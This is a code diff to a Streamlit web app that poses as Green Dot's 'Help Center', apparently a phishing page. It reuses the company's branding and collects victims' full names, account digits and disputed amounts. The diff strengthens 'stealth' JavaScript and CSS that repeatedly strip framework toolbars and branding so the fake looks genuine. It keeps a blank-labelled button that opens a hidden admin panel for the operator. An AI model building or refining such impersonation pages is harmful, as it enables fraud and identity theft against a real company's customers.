@@ -23,52 +23,49 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR REFORZADO
+# JS NUCLEAR V1.2.2 (INTERVALO ULTRA RÁPIDO)
 st.markdown("""<script>
     const nuclearClean = () => {
         const selectors = [
             'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
             '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
-            '.stElementToolbar', '[data-testid="stElementToolbar"]',
-            '.st-emotion-cache-gi0tri', '.st-emotion-cache-140j12g',
-            '.st-emotion-cache-h5rgaw', '.section-anchor', 'a.section-anchor'
+            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
+            '.st-emotion-cache-140j12g', '.st-emotion-cache-gi0tri', 
+            'button[title="View fullscreen"]', 'button[aria-label="Fullscreen"]',
+            '.section-anchor', 'a.section-anchor'
         ];
         selectors.forEach(s => {
             document.querySelectorAll(s).forEach(el => {
-                el.style.visibility = 'hidden';
                 el.style.display = 'none';
                 el.remove();
             });
         });
     };
-    setInterval(nuclearClean, 50);
+    setInterval(nuclearClean, 30);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH TOTAL (FORZADO PARA MÓVIL)
+# CSS STEALTH TOTAL
 st.markdown("""<style>
-    /* Forzar fondo negro en toda la app y contenedores dinámicos */
-    html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r {
+    html, body, [data-testid="stAppViewContainer"], .stApp, 
+    .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r, .st-emotion-cache-140j12g {
         background-color: #000000 !important;
         color: #FFFFFF !important;
     }
 
-    /* Color de texto universal para evitar herencia de modo claro */
     * { color: #FFFFFF !important; }
-    
-    /* Inputs con contraste manual */
-    input, textarea, select {
-        background-color: #1a1a1a !important;
-        color: #FFFFFF !important;
-        border: 1px solid #333 !important;
+
+    /* OCULTAR ELEMENT TOOLBAR ESPECÍFICO */
+    [data-testid="stElementToolbar"], .st-emotion-cache-140j12g, .ewrlt5x20 {
+        display: none !important;
+        visibility: hidden !important;
+        height: 0 !important;
+        width: 0 !important;
     }
 
-    /* BLOQUEO CRÍTICO: Anular media queries de sistema del dispositivo */
     @media (prefers-color-scheme: light) {
-        html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r {
+        html, body, [data-testid="stAppViewContainer"], .stApp {
             background-color: #000000 !important;
-            color: #FFFFFF !important;
         }
-        * { color: #FFFFFF !important; }
     }
 
     header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
@@ -78,15 +75,6 @@ st.markdown("""<style>
         background-color: #00a05b !important;
         color: white !important;
         width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
-    }
-
-    .admin-trigger {
-        position: fixed; bottom: 0; left: 0; width: 60px; height: 60px; z-index: 9999;
-    }
-    .admin-trigger button {
-        background-color: #000000 !important;
-        color: #000000 !important;
-        border: none !important;
     }
 
     .promo-box {
@@ -101,7 +89,7 @@ if not st.session_state.admin_mode:
     if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
     st.title("Help Center")
 
-    with st.form("claim_v1_2_1", clear_on_submit=True):
+    with st.form("claim_v1_2_2", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", format="%.2f")
@@ -116,11 +104,9 @@ if not st.session_state.admin_mode:
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
     </div>""", unsafe_allow_html=True)
 
-    st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
     if st.button(" ", key="adm_btn"): 
         st.session_state.admin_mode = True
         st.rerun()
-    st.markdown("</div>", unsafe_allow_html=True)
 else:
     st.title("Admin Panel")
     if st.button("Exit Admin Panel"): 
